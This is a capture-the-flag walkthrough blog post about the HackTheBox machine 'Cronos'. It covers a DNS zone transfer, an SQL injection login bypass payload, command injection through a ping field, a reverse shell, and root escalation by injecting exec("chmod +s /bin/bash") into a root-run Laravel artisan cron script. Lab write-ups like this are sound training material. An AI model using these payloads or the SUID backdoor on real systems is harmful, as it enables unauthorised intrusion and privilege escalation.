@@ -1,0 +1,161 @@
+---
+layout: post
+title:  "HackTheBox - Cronos"
+date:   2021-08-11 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
+|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
+|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
+53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+We search for dns using gobuster since directory bruteforcing doesn't return anything interesting, but we dont find any subdomains either. So we use dig command for further enumeration:
+```
+AXFR offers no authentication, so any client can ask a DNS server for a copy of the entire zone. This means that unless some kind of protection is introduced, an attacker can get a list of all hosts for a domain, which gives them a lot of potential attack vectors.
+```
+It returns some interesting subdomains out of which admin.cronos.htb has a login page:
+```s
+dig axfr @10.10.10.13 cronos.htb              
+
+; <<>> DiG 9.16.11-Debian <<>> axfr @10.10.10.13 cronos.htb
+; (1 server found)
+;; global options: +cmd
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.             604800  IN      NS      ns1.cronos.htb.
+cronos.htb.             604800  IN      A       10.10.10.13
+admin.cronos.htb.       604800  IN      A       10.10.10.13
+ns1.cronos.htb.         604800  IN      A       10.10.10.13
+www.cronos.htb.         604800  IN      A       10.10.10.13
+cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+;; Query time: 92 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: Wed Aug 11 13:21:09 EDT 2021
+;; XFR size: 7 records (messages 1, bytes 203)
+```
+# FOOTHOLD
+
+It seems to be SQLi at work  and trying out simple payloads we see that this is successful and we are able to log in:
+```
+admin' or '1'='1' -- -
+```
+We see that it is running some traceroute and ping commands on analysing via burpsuite.So we try to run commands simultaneously:
+```
+8.8.8.8|id
+```
+It gives us the answer www-root. So we try ls and whoami in the same way ,and since both of them work, I try putting my Netcat openBSD reverse-shell and see that we have got a shell in our listener!After this we stabilise our reverse shell using socat.
+
+User flag is in /home/noulis/user.txt
+
+# PRIVILEGE ESCALATION
+
+In /var/www/admin we see some config files which have mysql password and username but none of them help us escalate our privileges and also we find nothing interesting in database.
+```php
+www-data@cronos:/var/www/admin$ cat config.php
+<?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'admin');
+   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+   define('DB_DATABASE', 'admin');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+?>
+```
+Since the name of the box is Cronos we assumed it has something to do with crontab and see this cronjob running:
+```s
+www-data@cronos:/var/www/laravel$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc  ron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+#
+```
+We try to see what are the contents of the file and since root is running the cronjob and we have write permissions, we open the file via vim and add one line "chmod +s /bin/bash" before the exit command.Here's my final script:
+```php
+www-data@cronos:/var/www/laravel$ cat artisan
+#!/usr/bin/env php
+<?php
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader
+| for our application. We just need to utilize it! We'll require it
+| into the script here so that we do not have to worry about the
+| loading of any our classes "manually". Feels great to relax.
+|
+*/
+
+require __DIR__.'/bootstrap/autoload.php';
+
+$app = require_once __DIR__.'/bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Artisan Application
+|--------------------------------------------------------------------------
+|
+| When we run the console application, the current CLI command will be
+| executed in this console and the response sent back to a terminal
+| or another output device for the developers. Here goes nothing!
+|
+*/
+
+$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);
+
+$status = $kernel->handle(
+    $input = new Symfony\Component\Console\Input\ArgvInput,
+    new Symfony\Component\Console\Output\ConsoleOutput
+);
+
+/*
+|--------------------------------------------------------------------------
+| Shutdown The Application
+|--------------------------------------------------------------------------
+|
+| Once Artisan has finished running. We will fire off the shutdown events
+| so that any final work may be done by the application before we shut
+| down the process. This is the last thing to happen to the request.
+|
+
+*/
+
+exec("chmod +s /bin/bash");
+$kernel->terminate($input, $status);
+
+exit($status); 
+```
+After this we wait a bit and then run "bash -p" to get root.
+```s
+www-data@cronos:/var/www/laravel$ bash -p
+bash-4.3# whoami
+root
+bash-4.3#
+```
+Root flag is in /root/root.txt
